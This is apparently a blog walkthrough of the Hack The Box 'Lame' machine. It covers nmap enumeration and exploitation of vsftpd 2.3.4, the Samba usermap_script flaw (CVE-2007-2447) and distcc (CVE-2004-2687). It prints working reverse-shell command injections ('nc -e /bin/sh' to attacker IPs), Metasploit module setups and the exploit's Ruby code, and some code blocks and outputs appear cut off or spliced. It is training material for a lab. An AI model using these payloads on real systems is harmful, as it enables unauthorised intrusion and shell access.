title: Hack The Box - Lame
category: tech
tags: ["tutorial"]
---

Welcome back to another HackTheBox walkthrough! In this post, we’ll be exploring **Lame**, a machine known for its beginner-friendly difficulty level. What makes this walkthrough special is that I’ll be showing you different methods to root the machine—both with and without using Metasploit. By the end, you’ll have a solid understanding of various exploitation techniques and how to apply them.

## Machine Overview

**Lame** is one of the easier boxes on HackTheBox, rated as "easy." It serves as an excellent introduction to penetration testing and CTF challenges. We’ll go through the steps of reconnaissance, enumeration, exploitation, and privilege escalation, showing multiple paths to root.

## Step 1: Reconnaissance

We start our journey by gathering as much information as possible about the target. Nmap is our tool of choice for initial reconnaissance.

### Nmap Scan

We’ll run an Nmap scan with the `-A` option to perform a detailed scan:

```
nmap -A 10.10.10.3
```
![image](https://github.com/user-attachments/assets/b972e142-42f7-4fdb-9627-b8a0e7c83637)

At this point, we've identified the services running on the target machine. The services that stand out are as follows:

```
| Port Number | Service     | Version                                                     |
| ----------- | ----------- | ----------------------------------------------------------- |
| 21/tcp      | FTP         | vsftpd 2.3.4                                                |
| 22/tcp      | SSH         | OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)                |
| 139/tcp     | NetBIOS-SSN | Samba smbd 3.X - 4.X (workgroup: WORKGROUP)                 |
| 445/tcp     | NetBIOS-SSN | netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP) |
```
After conducting a full scan, we discovered an additional service of interest:

```
nmap -Pn -A -p- 10.10.10.3
```
The newly identified service is as follows:

```
|Port Number|Service   |Version                                         |
|-----------|----------|------------------------------------------------|
|3632/tcp   |distccd   |distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))|
```
Furthermore, we performed a more focused scan on this specific port:

```
nmap -Pn -p 3632 10.10.10.3
```
This scan confirmed the presence of the `distccd` service on port `3632`.


## Step 2: Enumeration

### <u>FTP - TCP 21</u>

We start by checking if the FTP service allows anonymous login:

```
ftp 10.10.10.3
```

After logging in as "anonymous," we find no valuable files

```
┌──(kali㉿kali)-[~/HTB/Machines/Lame]
└─$ ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)

ftp> ls
229 Entering Extended Passive Mode (|||29622|).
150 Here comes the directory listing.
226 Directory send OK.
ftp> quit
221 Goodbye.

```

let's do more enumeration. 

we identified the ftp version (vsFTPd 2.3.4). so a quick google search shows us that this version is famously vulnerable to a backdoor command execution that is triggered by entering a string that contains the characters `:)` as the username. When the backdoor is triggered, the target machine opens a shell on port `6200`. This exploit is simple enough to exploit manually but we’re trying to move to more automation so let’s see if there is an nmap script that already checks for that. (We will explore how the manual exploitation of this backdoor works later in the **Exploitation** section, and we'll dive deeper into it in the **Beyond Root** section.)

```
ls /usr/share/nmap/scripts/ftp*
```

Execute the script on port 21 of the target machine.

```
nmap --script ftp-vsftpd-backdoor -p 21 10.10.10.3
```

The script output shows that we’re not vulnerable to this vulnerability. 

Even we can use `searchsploit`  search for vulnerabilities associated with vsFTPd 2.3.4.

```
kali@kali:~$ searchsploit vsFTPd 2.3.4
--------------------------------------------------------------------------------------------
 Exploit Title                                           |  Path
--------------------------------------------------------------------------------------------
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)   | unix/remote/17491.rb
--------------------------------------------------------------------------------------------
Shellcodes: No Results
```

The description of **EDB-ID 17491** reveals that the `vsftpd-2.3.4.tar.gz` archive was compromised and backdoored for a specific period. Attackers introduced a malicious backdoor that could be exploited by entering `:)` as the username. However, this backdoor was identified and removed on July 3, 2011, closing the vulnerability.

###  <u>SSH - Port 22 -(OpenSSH v4.7p1)</u>

My go-to resource for checking [Ubuntu packages](https://packages.ubuntu.com/search?keywords=openssh-server) doesn't list this version of OpenSSH, indicating that the operating system on the target machine is quite old. A quick Google search suggests that this version of OpenSSH is likely from [Ubuntu 8.04 Hardy Heron](https://launchpad.net/ubuntu/+source/openssh/1:4.7p1-8ubuntu1).

![Pasted image 20240831050426](https://github.com/user-attachments/assets/8579fe52-a82a-40dc-8554-ddfa0f1e795a)

![Pasted image 20240831050438](https://github.com/user-attachments/assets/58b993c4-f1b5-4b99-9eda-fa7636c0e1cc)

After a quick Google search, nothing major turns up regarding specific vulnerabilities for this version. However, `Nmap` includes multiple scripts capable of brute-forcing credentials, among other things. We can list the available SSH-related scripts with the following command:

```
ls /usr/share/nmap/scripts/ssh*
```

Since this process might take a while and could potentially lead us nowhere, we'll put this on the back burner for now and revisit it later if the other points of entry don't pan out.

### <u>SMB  - Ports 139 and 445 (Samba v3.0.20-Debian)</u>

We start by using `smbmap` to enumerate the available SMB shares on the target machine:

```
smbmap -H 10.10.10.3
```

The output indicates that only one share, `tmp`, is accessible without credentials:

```
root@kali# smbmap -H 10.10.10.3
[+] Finding open SMB ports....
[+] User SMB session established on 10.10.10.3...
[+] IP: 10.10.10.3:445  Name: 10.10.10.3
        Disk                                                    Permissions
        ----                                                    -----------
        print$                                                  NO ACCESS
        tmp                                                     READ, WRITE
        opt                                                     NO ACCESS
        IPC$                                                    NO ACCESS
        ADMIN$                                                  NO ACCESS   

```

Next, we try to enumerate the SMB shares using `smbclient`:

```
smbclient -L //10.10.10.3 -N
```

![image](https://github.com/user-attachments/assets/303bd0b7-04a4-47d9-a8df-19d155d5b6e6)

#### **smbclient Error**

Attempting to connect to the `tmp` share without credentials results in an error:

```
root@kali# smbclient -N //10.10.10.3/tmp
protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
```

It turns out that my client is configured for security reasons to not connect to older SMB versions. To resolve this, I added the following line to my `/etc/samba/smb.conf` file:

```
[global]
client min protocol=NT1
```

Alternatively, We could add this as a command-line option:

```
root@kali# smbclient -N //10.10.10.3/tmp --option='client min protocol=NT1'
```

After making these adjustments, I successfully connected to the share:

```
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> 

```
![image](https://github.com/user-attachments/assets/72610abe-5d1e-4a3d-bed8-3af43921bd2e)


However, logging in reveals that the `tmp` share is mapped to `/tmp`, and there doesn’t seem to be anything of interest.

#### **Searching for Vulnerabilities**

Let’s search for vulnerabilities associated with Samba smbd 3.0.20-Debian using `searchsploit`. The search results point us to **EDB-ID 16320** and **CVE-2007-2447**, commonly referred to as the Samba usermap script vulnerability:

```
kali@kali:~$ searchsploit samba 3.0.20
-------------------------------------------------------------------------------------------------------------------------
 Exploit Title                                                                                                           |  Path

Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                         | unix/remote/16320.rb

-------------------------------------------------------------------------------------------------------------------------
Shellcodes: No Results

```

A closer look at **CVE-2007-2447** reveals that this vulnerability is associated with the username field in the Samba service. By injecting shell metacharacters into the username, we can execute arbitrary commands on the target machine. Although the [exploit](https://www.exploit-db.com/exploits/16320) available on Exploit-DB uses Metasploit, a closer examination of the script shows that it essentially runs the following command:


```
"/=`nohup " + payload.encoded + "`"
```
This command sends a reverse shell back to our attack machine. But before we exploit this vulnerability, let’s check out our last point of entry.

### <u>Port - 3632 (distcc v1)</u>

Googling **"distcc v1"** reveals that this service is known to be vulnerable to remote code execution. Fortunately, there's an `nmap` script that can verify this vulnerability. To check if the target is affected, use the following command:

```
nmap --script distcc-cve2004-2687 -p 3632 10.10.10.3
```

The results indicate that the target is indeed vulnerable!

## Step 3 : Exploitation

### VSFTPD Exploit
---

#### <u>Without Metasploit</u>

A quick Google search reveals that this version of VSFTPD (2.3.4) is famously vulnerable to a backdoor command execution. The backdoor can be triggered by entering a string containing the characters `":)"` as the username. When activated, it opens a shell on port 6200 on the target machine.

To test this manually, I connected to the FTP service and logged in with a username ending in `:)`:

```
root@kali# nc 10.10.10.3 21
220 (vsFTPd 2.3.4)
USER n3rdyn3xus:)
331 Please specify the password.
PASS n3rdyn3xus-not-a-password
```

If the exploit worked, I should be able to connect to a listener on port 6200. However, the connection attempt times out:

```
root@kali# nc 10.10.10.3 6200
Ncat: TIMEOUT.
```

#### <u>With Metasploit</u>

To demonstrate the exploit with Metasploit, I start by launching `msfconsole` and searching for the exploit module:

```
msf5 > search vsftpd

Matching Modules
================

   Name                                  Disclosure Date  Rank       Check  Description

```

I select the module and configure it:

```
msf5 > use exploit/unix/ftp/vsftpd_234_backdoor
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   RPORT   21               yes       The target port (TCP)

```

Set the target address:

```
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts 10.10.10.3
rhosts => 10.10.10.3
```

Next, I set the payload to `cmd/unix/interact` and run the exploit:

```
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set payload cmd/unix/interact 
payload => cmd/unix/interact
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > options

   RHOSTS  10.10.10.3       yes       The target address range or CIDR identifier
   RPORT   21               yes       The target port (TCP)

Payload options (cmd/unix/interact):

   Name  Current Setting  Required  Description

[*] Exploit completed, but no session was created.

```

The Metasploit exploit also fails to create a session.


### SAMBA Exploit
---

### <u>Completely Manually</u>

#### Script Analysis

To understand the Samba exploit, I obtained the source code for the Metasploit module:

```
root@kali# searchsploit -m exploits/unix/remote/16320.rb
```
Script Content Overview: The script exploits a command execution vulnerability in Samba versions 3.0.20 through 3.0.25rc3. By specifying a username containing shell meta characters, attackers can execute arbitrary commands. The vulnerable username map script option allows this without requiring authentication.

        end


        def exploit

                connect

                # lol?
                username = "/=`nohup " + payload.encoded + "`"
                begin
                        simple.client.negotiate(false)
                        simple.client.session_setup_ntlmv1(username, rand_text(16), datastore['SMBDomain'], false)
                rescue ::Timeout::Error, XCEPT::LoginError
                        # nothing, it either worked or it didn't ;)
                end

                handler
        end

end
```

The crucial part of the Samba exploit script is located in the `def exploit` function:

```ruby
def exploit
    connect
    username = "/=`nohup " + payload.encoded + "`"
    begin
        simple.client.negotiate(false)
        simple.client.session_setup_ntlmv1(username, rand_text(16), datastore['SMBDomain'], false)
    rescue ::Timeout::Error, XCEPT::LoginError
        # nothing, it either worked or it didn't ;)
    end
    handler
end
```

Explanation:

Username Construction:
* `username = "/=nohup " + payload.encoded + ""`
* This uses shell meta characters: ` (backticks) to execute commands on the target machine. The payload.encoded is a placeholder for the payload that will be executed on the target.

Password and Domain:

* Password: A random 16 characters are used.
* Domain: The domain is user-provided.

How It Works:

* On Linux systems, the backtick ` is used to execute commands within a command line. Similarly, $() can be used for command substitution.
* The exploit manipulates Samba to execute arbitrary commands by injecting them into the username field.
* `nohup` is used to run the payload in the background, which ensures it continues to run even if the session is closed.

By sending a specially crafted username with embedded shell commands, Samba can be tricked into executing the payload on the target machine. This technique exploits a flaw in Samba's handling of the username map script option.


Add a listener on attack machine.

```
nc -nlvp 4444
```

Log into the smb client.

```
smbclient //10.10.10.3/tmp
```

we’ll send shell metacharacters into the username with a reverse shell payload.

```
logon "/=`nohup nc -nv 10.10.14.6 4444 -e /bin/sh`"
```

```
smb: \> logon "./=`nohup nc -e /bin/sh 10.10.14.24 443`"
Password: 
session setup failed: NT_STATUS_IO_TIMEOUT
```

I get a connection from Lame with a root shell:

```
root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443

### <u>With Metasploit</u>

To exploit the Samba vulnerability using Metasploit, follow these steps:

Start Metasploit:
```
sudo msfconsole -q
```

Use the Exploit Module:
```
msf5 > use exploit/multi/samba/usermap_script
```

Set the Target IP:
```
msf5 exploit(multi/samba/usermap_script) > set rhosts 10.10.10.3
rhosts => 10.10.10.3
```

Set the Payload:
```
msf5 exploit(multi/samba/usermap_script) > set payload cmd/unix/reverse
payload => cmd/unix/reverse
```

Set the Local Host and Port:
```
msf5 exploit(multi/samba/usermap_script) > set lhost tun0
lhost => 10.10.14.24
msf5 exploit(multi/samba/usermap_script) > set lport 443
lport => 443
```

### distcc - TCP 3632
---

#### Background

For those unfamiliar with `distcc`, it’s a tool designed to distribute compilation tasks across a network of machines. The tool consists of a server (`distccd`) and a client program (`distcc`). According to the [Gentoo Wiki](https://wiki.gentoo.org/wiki/Distcc/en), distcc can work with tools like `ccache` and `Portage` with minimal setup. However, misconfigurations can leave it open to exploitation.

### Identifying the Exploit

To confirm if the distccd service is vulnerable, I used searchsploit to find potential exploits:

```
root@kali# searchsploit distcc
-------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                |  Path
                                                              | (/usr/share/exploitdb/)
-------------------------------------------------------------- ----------------------------------------
DistCC Daemon - Command Execution (Metasploit)                | exploits/multiple/remote/9915.rb
-------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result

```

The search revealed a Metasploit module for command execution against the distcc daemon. This aligns with [CVE-2004-2687](https://nvd.nist.gov/vuln/detail/CVE-2004-2687), which notes that distcc, when misconfigured, allows remote command execution without authorization.

### <u>Using an Nmap Script</u>

I found an `nmap` script that directly tests for this vulnerability: [distcc-cve2004-2687.nse](https://svn.nmap.org/nmap/scripts/distcc-cve2004-2687.nse). This script isn’t included with `nmap` by default, so I downloaded it:

```
root@kali# wget https://svn.nmap.org/nmap/scripts/distcc-cve2004-2687.nse -O /usr/share/nmap/scripts/distcc-exec.nse
```

Now I can run it and get results:

```
root@kali# nmap -p 3632 10.10.10.3 --script distcc-exec --script-args="distcc-exec.cmd='id'"
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 14:38 EDT

|_      https://distcc.github.io/security.html

Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds
```

As shown above, the target is indeed vulnerable to command execution, making it an easy target for exploitation.

#### **Shell as daemon**

In the previous step, we demonstrated command execution using the `id` command, which confirmed that the process was running as the `daemon` user. Now, the next logical step is to gain a shell. By leveraging a simple netcat reverse shell, we can easily escalate our access.

First, I started a Netcat listener on my machine to catch the reverse shell:

Next, I modified the `distcc-exec` Nmap script to replace the `id` command with a reverse shell payload using Netcat:

```
root@kali# nmap -p 3632 10.10.10.3 --script distcc-exec --script-args="distcc-exec.cmd='nc -e /bin/sh 10.10.14.24 4444'"
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 14:41 EDT
Nmap scan report for 10.10.10.3
Host is up (0.013s latency).

PORT     STATE SERVICE
3632/tcp open  distccd

Nmap done: 1 IP address (1 host up) scanned in 30.48 seconds
```

As soon as I executed the modified script, the shell connected back to my listener, and I gained access to the target machine:

```
root@kali# nc -lnvp 4444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.3.
Ncat: Connection from 10.10.10.3:57188.
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

I’ll upgrade it with `python -c 'import pty;pty.spawn("bash")'`, `ctrl-z`, `stty raw -echo`, `fg`, `reset`, and have a proper shell. I can grab `user.txt`:

```
daemon@lame:/home/makis$ cat user.txt 
69454a93************************
```

### <u>Python Script</u>

To exploit the `distccd` vulnerability (CVE-2004-2687), you can use a Python script that automates the process of gaining remote code execution. You can download the script from the following GitHub repository:

https://github.com/N3rdyN3xus/distccd_rce_CVE-2004-2687.git

The script connects to the vulnerable `distccd` service, sends the crafted payload, and executes the specified command. Once executed, the script will return the output of the command, or in this case, provide a reverse shell.

#### **Getting a Shell**

Once you've executed the Python script, you should receive a reverse shell. Here's an example command to execute the script:

```
python3 distccd_rce.py -t 10.10.10.3 -p 3632 -c "nc 10.10.16.18 4444 -e /bin/sh"
```

This command tells the script to connect to the target machine on port 3632 and execute a reverse shell command, which will connect back to your machine on port 4444.

And we get a shell! 

```
root@kali# nc -lnvp 4444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.3.
Ncat: Connection from 10.10.10.3:57188.
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

```
python3 -c 'import pty; pty.spawn("/bin/bash")' 
Ctrl-Z 
stty raw -echo 
fg 
reset
```

### <u>Exploiting distccd with Metasploit</u>

```
kali@kali:~$ searchsploit distcc
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                           |  Path
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
DistCC Daemon - Command Execution (Metasploit)                                                                           | multiple/remote/9915.rb
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Next, start the Metasploit console and load the exploit module for distcc_exec:

```
kali@kali:~$ msfconsole
msf5 > use exploit/unix/misc/distcc_exec
```

Once the module is loaded, you can configure the necessary options. The key option here is RHOSTS, which is the IP address of the target machine.

```
msf5 exploit(unix/misc/distcc_exec) > options

Module options (exploit/unix/misc/distcc_exec):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   3632             yes       The target port (TCP)

```

Set the RHOSTS to your target IP:

```
msf5 exploit(unix/misc/distcc_exec) > set rhosts 10.10.10.3
rhosts => 10.10.10.3
```

Set the payload:

```
set payload payload/cmd/unix/reverse
```

Finally, run the exploit to execute the payload on the target:

```
msf5 exploit(unix/misc/distcc_exec) > exploit
```
